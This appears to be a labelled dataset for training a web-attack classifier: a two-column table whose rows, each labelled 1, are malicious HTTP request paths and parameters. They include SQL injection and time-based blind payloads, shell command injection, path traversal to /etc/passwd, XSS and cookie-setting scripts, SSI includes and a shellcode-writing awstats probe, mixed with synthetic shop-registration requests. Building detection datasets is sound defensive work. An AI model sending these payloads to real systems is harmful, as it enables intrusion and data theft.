sentences 	 labels
/ string / strings / parameters = 1 )  )  )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  ( 6051 = 6051  \r\n\r\n 	 1
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo aivpgh )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  "  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  union all select null , null , null , null , null , null , null , null , null #  \r\n\r\n 	 1
/ cgi-bin / forum / hcspecific / enableforum . asp ? action = enableforum & forumid =  ' hosting_controller_forumid_sql_injection . nasl  \r\n\r\n 	 1
/ forum-ra . asp ? n =  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = | echo sbqefz $  (  ( 80 + 12 )  )  $  ( echo sbqefz ) sbqefz \  \r\n\r\n 	 1
/ javascript /  . svn . exe  \r\n\r\n 	 1
/ vmi8bb12 . x ?  < meta http-equiv = set-cookie content =  " testlerc = 2575 "  >  \r\n\r\n 	 1
/ string / strings / parameters = -3460 %  "  "  )  )  )  or 9323 = 9323 #  \r\n\r\n 	 1
/ 8t9v8k7x . dll ?  < meta http-equiv = set-cookie content =  " testhvje = 9403 "  >  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  where 1443 = 1443 union all select null , null , null , null , null #  \r\n\r\n 	 1
/ javascript / cache . exe  \r\n\r\n 	 1
/ cgi-bin / search . jsp ? q =  %  "  < script > alert ( 1331909235 )  <  / script >  \r\n\r\n 	 1
/ cgi-bin / gadgets / blog / blogmodel . php ? path =  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo riizgu )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  '  \r\n\r\n 	 1
/ string / strings / parameters = & echo cuktgk $  (  ( 2 + 61 )  )  $  ( echo cuktgk ) cuktgk "  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  )  ; select pg_sleep ( 5 )  --  \r\n\r\n 	 1
/ 9o6g5vkn . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ en-us / 9kr0ih0v . fts ?  < script > document . cookie =  " testzgnm = 1183 ;  "  <  / script >  \r\n\r\n 	 1
/ string / id = 3 & nombre = queso + manchego & precio = 39 & cantidad = 67 & b1 =  <  !  --  # exec + cmd =  " ls +  /  "  --  >  \r\n\r\n 	 1
/ main . php ? logout = ver ,  > q38131719 & rem ,  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  in boolean mode )  union all select null , null , null , null , null , null , null , null , null , null --  \r\n\r\n 	 1
/ main . php ? logout =  ' rm q29138864  #  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  |  |  ( select  ' ybfo '  from dual where 3319 = 3319 union all select null , null , null , null , null , null , null , null #  \r\n\r\n 	 1
/ i7prbs22 . cfm ?  < meta http-equiv = set-cookie content =  " testjnre = 7328 "  >  \r\n\r\n 	 1
/ string / modo = registro & login = rygwalsk & password = ve50able & nombre = francisco & apellidos = pallares + milara \r\n\r\n 	 1
/ string / strings / parameters = < style type =  " text / css "  >  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo eekjde )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  \r\n\r\n 	 1
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 22 + 6a + ff + ff + d0 + 89 + ec + 61 + 52 + 51 + 68 + 75 + 70 + 00 + 00 + 68 + 74 + 61 + 72 + 74 + 68 + 57 + 53 + 41 + 53 +  +  >  > ctdn  \r\n\r\n 	 1
/ hipkz026 . pl ?  < script > document . cookie =  " testyrbs = 2855 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  union all select null , null , null , null , null , null #  \r\n\r\n 	 1
/ 33y9gcqq . aspx ?  < script > document . cookie =  " testnvxc = 4301 ;  "  <  / script >  \r\n\r\n 	 1
/ l13b77e5 . do ?  < script > document . cookie =  " testjvvf = 7721 ;  "  <  / script >  \r\n\r\n 	 1
/ cgi-bin / index . php ? page =  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select ohqr where 5610 = 5610 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  )  +  '  \r\n\r\n 	 1
/ help . php ? q =  & ver  > q76744966 & rem  \r\n\r\n 	 1
/  .  . 0x2f .  . 0x2f .  . 0x2f .  . 0x2f .  . 0x2f .  . 0x2f .  . 0x2f { file }  \r\n\r\n 	 1
/ examples / jsp / num / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331904404 '  )  <  / script >  \r\n\r\n 	 1
/ gotopage . cgi ? 4242 +  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ recordings / phpnews / sendtofriend . php ? mid =  ' 1 '  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  and 1736 = 4220  \r\n\r\n 	 1
/ examples / jsp / jsp2 / el / ovlaunch . exe  \r\n\r\n 	 1
/ j4oqyvga . html ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ azcrfs8d . pl ?  < script > document . cookie =  " testjpdr = 9205 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  and  (  '  %  '  =  '  \r\n\r\n 	 1
/ javascript / travel . exe  \r\n\r\n 	 1
/ string / modo = entrar & login =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & pwd = gamar9a & remember = off & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = ; echo wzqzmu $  (  ( 55 + 24 )  )  $  ( echo wzqzmu ) wzqzmu /  /  \r\n\r\n 	 1
/ template . php ? actionspage = xxpathxx ?  \r\n\r\n 	 1
/ examples / jsp / colors / nessus "  >  < script > alert (  ' mod_perl_status_uri_xss . nasl '  )  <  / script >  \r\n\r\n 	 1
/ phpmyadmin . exe  \r\n\r\n 	 1
/ string / modo = registro & login = robbie & password = 7nexor40ilidad & nombre = milet & apellidos = alles + araujo & email = adix_adam @ easyviaggio . com . km & dni = 56876585t & direccion = calle + juan + montilla ,  + 50 + 1-a & ciudad = paterna & cp = 45870 & provincia = navarra & ntc = 9173328900592385 & b1a = registrar  \r\n\r\n 	 1
/ string / strings / parameters = < layer src =  " http :  /  / ha . ckers . org / scriptlet . html "  >  <  / layer >  \r\n\r\n 	 1
/ servlets / msgpage ? action = badlogin & msg =  < script > alert (  ' vulnerable '  )  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = < bgsound src =  "  " javascript : alert (  ' crosssitescripting '  )  ;  "  "  >  \r\n\r\n 	 1
/ string / id = 3 & nombre = ques + o + manchego & precio = 39 & cantidad = 82 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ string / strings / parameters = | echo afltja $  (  ( 66 + 14 )  )  $  ( echo afltja ) afltja &  \r\n\r\n 	 1
/ esmozg5d . fts ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ scripts / faq . php ? action =  & type = view & s =  & id = -1 '  union select 0 , 1340614335 , 0 , 0 , 0 , 0 , 0 --  \r\n\r\n 	 1
/ top . php ? stuff =  "  & ping \ x0b-w \ x0b9000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 & rem \ x0b  \r\n\r\n 	 1
/ show_archives . php ? template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = -3017 "  "  )  )  as ljit where 9128 = 9128 union all select 9128 , 9128 , 9128 , 9128 , 9128 --  \r\n\r\n 	 1
/ string / modo = registro & login = carli8 & password = 5im2n507 & nombre = jos + mara & apellidos = vilageli + bonet & email = baylor @ magichobby . sy & dni = 80135662m & direccion = calle + estrella + orion + 190 +  & ciudad = encinillas & cpa = 09681 & provincia = zaragoza & ntc = 2558545383527310 & b1 = registrar  \r\n\r\n 	 1
/ x7pclv4s . kspx ?  < meta http-equiv = set-cookie content =  " testiulz = 3709 "  >  \r\n\r\n 	 1
/ children ' s_software /  \r\n\r\n 	 1
/ edzaia0i . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ awstats / awstats . pl ? migrate =  | echo ;  / bin / echo -en  "  \ 0367 \ 0322 \ 0041 \ 03201 \ 0311qqj \ 0042j \ 0007pq \ 0211 \ 0343 "   >  >   / tmp / ldlchhikup0 ; echo | awstats826185 . txt  \r\n\r\n 	 1
/ d765w06j . html ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ b4vng02k . cfc ?  < meta http-equiv = set-cookie content =  " testtrlh = 3672 "  >  \r\n\r\n 	 1
/ i2n4v4rl . php ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ mv8wxfy9 . php3 ?  < script > document . cookie =  " testrhbc = 8184 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = "  `  '  >  < script >  \ xe2 \ x80 \ x84javascript : alert ( 1 )  <  / script >  \r\n\r\n 	 1
/ string / modo = registro & login = chauhan & password =  + rabosea4 & nombre = nelma & apellidos = j-o . rba + cl , ua & email = drayton @ callalabocaatiaherminia . int & dni = 71628074w & direccion = c /  + musico + juan + de + encinas + 10 + 8 ? c & ciudad = vilanova + i + la + geltr & cp = 48390 & provincia = burgos & ntc = 1031009266580150 & b1 = registrar  \r\n\r\n 	 1
/ fnwhrxyd . idc ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ phpmyadmin / shopexd . asp ? catalogid =  ' 42  \r\n\r\n 	 1
/ top . php ? stuff =  "  & del \ xa0q52711668 & rem \ xa0  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  )  )  union all select null , null , null , null , null , null , null , null , null , null #  \r\n\r\n 	 1
/ cacti / googlesearch / googlesearch . php ? app [ path ]  [ lib ]  =  / etc / passwd \ x00  \r\n\r\n 	 1
/ en-us / ddoworrl . x ?  < script > document . cookie =  " testvlau = 8517 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = # y ]  ; color : red ;  {  }  \r\n\r\n 	 1
/ string / modo =  <  !  --  # include + file =  " archivo_secreto "  +  --  >  & login = boschin & password = 3189p6zada & nombre = amadis & apellidos = funes + ports & email = gracie @ triplectextil . me & dni = 81791661g & direccion = carrer + pica + d ' estats + 113 ,  + 1 ? d & ciudad = pedrosillo + de + los + aires & cp = 03345 & provincia = guadalajara & ntc = 1272948221132397 & b1 = registrar  \r\n\r\n 	 1
/ examples / jsp / jsp2 / el / home ? dir =  /  & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd & lang = kor  \r\n\r\n 	 1
/ string / modo = registro & login = ailbert & password = complacedera & nombre = jano & apellidos = ucaay & email = leroy9 @ zarahealth . pa & dni = 8557185b6b & direccion = calle + kenya + 133 +  & ciudad = chiclana + de + segura & cp = 18230 & provincia = ourense & ntc = 6201867056010966 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  )  and elt ( 4483 = 5364 , 5364 )  and  (  (  '  %  '  =  '  \r\n\r\n 	 1
/ cgi-local / fileseek . cgi ? foot =  ; cat  / etc / passwd & head =  \r\n\r\n 	 1
/ string / strings / parameters = |  | echo $ ifsfyotzg $  (  ( 27 + 28 )  )  $  ( echo $ ifsfyotzg ) fyotzg /  /  \r\n\r\n 	 1
/ string / strings / parameters = '  ;  str =  $  ( echo qukucg )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  \r\n\r\n 	 1
/ azcrfs8d . html ?  < meta http-equiv = set-cookie content =  " testjpdr = 9205 "  >  \r\n\r\n 	 1
/ string / strings / parameters = | echo $ ifskqqqwp $  (  ( 52 + 17 )  )  $  ( echo $ ifskqqqwp ) kqqqwp |  \r\n\r\n 	 1
/ string / strings / parameters = '  )  )  )  )  waitfor delay  ' 0 : 0 : 20 '   /  *  \r\n\r\n 	 1
/ w4996nr0 . jsp ?  < meta http-equiv = set-cookie content =  " testttvs = 7163 "  >  \r\n\r\n 	 1
/ en-us / 33y9gcqq . x ?  < script > document . cookie =  " testnvxc = 4301 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 "  "  )  )  as casz where 5921 = 5921 rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) vwyq )  #  \r\n\r\n 	 1
/ string / strings / parameters = & echo eglump $  (  ( 59 + 73 )  )  $  ( echo eglump ) eglump "  \r\n\r\n 	 1
/ string / strings / parameters = ( sqlvuln )  \r\n\r\n 	 1
/ javascript / cc . exe  \r\n\r\n 	 1
/ m4kkjf8l . jspa ?  < script > document . cookie =  " testyglc = 8988 ;  "  <  / script >  \r\n\r\n 	 1
/ string / modo = entrar & login = mcmul + l ? in & pwd = acarrear & remember = off & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  )  )  or elt ( 6272 = 6272 , sleep ( 5 )  )  and  (  (  ( 9558 = 9558  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  )  union all select null , null , null , null , null , null , null , null , null --  \r\n\r\n 	 1
/ help . php ? q =  "  | ping , -w , 9000 , -n , 1 , 4 . 3 . 2 . 1 | rem ,  \r\n\r\n 	 1
/ string / strings / parameters = ;  str =  $  ( echo kfnnby )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  \r\n\r\n 	 1
/ string / strings / parameters = -1408 )  )  union all select 5715 , 5715 , 5715 , 5715 , 5715 , 5715 --  \r\n\r\n 	 1
/ help . php ? q =  "  & ver  > q26584324 & rem  \r\n\r\n 	 1
/ string / str =  $  ( echo nwelwc )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \r\n\r\n 	 1
/ string / modo = entrar & login = kos , s & pwd = gurbia & remember = off & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  +  ( select afst where 7454 = 7454 and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  )  +  '  \r\n\r\n 	 1
/ string / modo = entrar & login = lyliston & pwd = de4454 & remember = off /  & b1 = entrar  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  )  )  waitfor delay  ' 0 : 0 : 5 '  and  (  (  ' bbqk '  =  ' bbqk  \r\n\r\n 	 1
/ o1zj4u9v . kspx ?  < meta http-equiv = set-cookie content =  " testabrn = 6368 "  >  \r\n\r\n 	 1
/ phpmyadmin / lib / adodb_lite / adodb-perf-module . inc . php ? last_module = zzz_adoconnection {  } system ( id )  ; class zzz_adoconnection {  }  /  /  \r\n\r\n 	 1
/ string / strings / parameters = 1 where 6095 = 6095 and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  \r\n\r\n 	 1
/ string / strings / parameters = '  or 2 = 2  \r\n\r\n 	 1
/ string / strings / parameters = "  ;  str =  $  ( echo rqllbc )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  and 2716 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  \r\n\r\n 	 1
/ javascript / activex . exe  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  \r\n\r\n 	 1
/ phpslideshow . php ? directory = x '  >  < script > alert ( 413966083537 )  <  / script >  <  '  \r\n\r\n 	 1
/ string / strings / parameters = '  echo friwep $  (  ( 93 + 33 )  )  $  ( echo friwep ) friwep \  \r\n\r\n 	 1
/ ewc3rz1l . php ?  < script > document . cookie =  " testkgqo = 204 ;  "  <  / script >  \r\n\r\n 	 1
/ top . php ? stuff = ver \ x0c > q62584269 & rem \ x0c  \r\n\r\n 	 1
/ index . php ? func = manager & module = ew_filemanager & pathext =  .  .  /  .  .  /  .  .  / etc /  & type = admin & view = passwd  \r\n\r\n 	 1
/ string / modo = any  set-cookie :  + tamper = 5765205567234876235 & precio = 20 & b1 = pasar + por + caja  \r\n\r\n 	 1
/ string / strings / parameters = -8344 or 1570 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  --  wjpa  \r\n\r\n 	 1
/ l4fz1dqw . html ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = & echo titlcp $  (  ( 35 + 27 )  )  $  ( echo titlcp ) titlcp |  \r\n\r\n 	 1
/ 3hlysl2x . x ?  < meta http-equiv = set-cookie content =  " testgjbe = 8505 "  >  \r\n\r\n 	 1
/ fpnpp5zg . asp ?  < script > document . cookie =  " testyias = 101 ;  "  <  / script >  \r\n\r\n 	 1
/ w4996nr0 . pl ?  < script > document . cookie =  " testttvs = 7163 ;  "  <  / script >  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  and 4595 = 4595 #  \r\n\r\n 	 1
/ string / strings / parameters = '  & echo $ ifsmywsgv $  (  ( 8 + 92 )  )  $  ( echo $ ifsmywsgv ) mywsgv  \r\n\r\n 	 1
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = q57256611 & frm_user =  & scr_height =  & scr_width =  \r\n\r\n 	 1
/ string / modo = registro & login = zander & password = arcasta & nombre = zain & apellidos = espriella + morcos & email = skala @ lamarsrl . la & dni = 28264646s & direccion = nardo ,  + 106 ,  + 7-h & ciudad =  <  !  --  # include + file =  " archivo_secreto "  +  --  >  & cp = 46315 & provincia = alicante & ntc = 5436324330428646 & b1 = registrar  \r\n\r\n 	 1
/ javascript / ads . exe  \r\n\r\n 	 1
/ string / strings / parameters = -9496 )  )  )  or elt ( 7511 = 3951 , 3951 )  and  (  (  ( 3514 = 3514  \r\n\r\n 	 1
/ 606wkcop . do ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 1
/ string / strings / parameters = |   [  3 -ne  $  ( echo ajewoj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  \r\n\r\n 	 1
/ string / modo = registro & login =  ? lore * nza & password = 7n3i083zo & nombre = toms & apellidos = mares + mulleras & email = aylmer @ pisossantcugat . pl & dni = 04472501j & direccion = gravina + 197 + 3 ? h & ciudad = calzadilla + de + tera & cp = 46827 & provincia = cuenca & ntc = 7996895110966395 & b1 = registrar  \r\n\r\n 	 1
/ string / strings / parameters = |   [  2 -ne  $  ( echo pctukx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  \r\n\r\n 	 1
/ string / strings / parameters = '  |   [  8 -ne  $  ( echo rlzfde  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  #  \r\n\r\n 	 1
/ examples / jsp / num / file . cgi ? name =  / eventcache /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  )  )  )  and 3754 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  (  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ string / strings / parameters = |   [  9 -ne  $  ( echo pdveeq  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \r\n\r\n 	 1
/ string / strings / parameters = 1 )  )  )  union all select null #  \r\n\r\n 	 1
/ index . php ? dateipfad = xxpathxx ?  & cmd = ls  \r\n\r\n 	 1
/ phpmyadmin / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331904220 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00  \r\n\r\n 	 1
/ string / strings / parameters = |   [  8 -ne  $  ( echo dlkwgt  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  \r\n\r\n 	 1
/ string / strings / parameters = 1 '  where 2690 = 2690 ; select count (  *  )  from generate_series ( 1 , 5000000 )  --  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  "  "  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  "  "  %  "  "  =  "  "  \r\n\r\n 	 1
/ javascript / 2013 . exe  \r\n\r\n 	 1
/ include / pear / itx . php ? basepath = xxpathxx ?  \r\n\r\n 	 1
/ string / modo = registro & login = brassard & password = la0 / 01m9c ' e ' 7 & nombre = daymn & apellidos = aller + mayn & email = senghor-golling3 @ 24htranslations . ht & dni = 96190989k & direccion = calle + agata ,  + 33 ,  + 3 ? g & ciudad = redonda ,  + la & cp = 46822 & provincia = las + palmas & ntc = 2633454228346658 & b1 = registrar  \r\n\r\n 	 1
/ string / id = 2 & nombre = vino + rioja +  & precio = 85 & cantidad = 23 & b1 = aadir + al + carrito  \r\n\r\n 	 1
/ hipkz026 . mscgi ?  < script > document . cookie =  " testyrbs = 2855 ;  "  <  / script >  \r\n\r\n 	 1
/ accsess / login . php ? path_to_root = xxpathxx  \r\n\r\n 	 1
/ string / modo = registro & login = nolen & passworda = permanenteme * nte & nombre = atila & apellidos = ingla + campaner & email = schollwer . stoddard @ zeat . ms & dni = 99500842j & direccion = serafin ,  + 65 + 9-b & ciudad = castrillo-tejeriego & cp = 22792 & provincia = tarragona & ntc = 8835278946526416 & b1 = registrar  \r\n\r\n 	 1
/ ftp / ftp . pl ? dir =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc  \r\n\r\n 	 1
/ string / strings / parameters = 1 %  '  )  )  )  union all select null , null , null , null , null --  \r\n\r\n 	 1
/ string / strings / parameters = a href =  " j &  # x26 ;  # x26 # x41 ; vascript : confirm ( 31337 )  "  > hello <  / a >  \r\n\r\n 	 1
/ examples / jsp / sessions / atomicboard / index . php ? location =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 1
/ string / modo = registro & login = vera & password = 0ip0rbol1id7 & nombre = n ? el + ma & apellidos = artells + arteta & email = henn_others @ lasmilyuna . gi & dni = 13605020z & direccion = paseo + alcalde + rafael + ginel ,  + 121 +  & ciudad = fuentelisendo & cp = 09219 & provincia = madrid & ntc = 6311255681512253 & b1 = registrar  \r\n\r\n 	 1
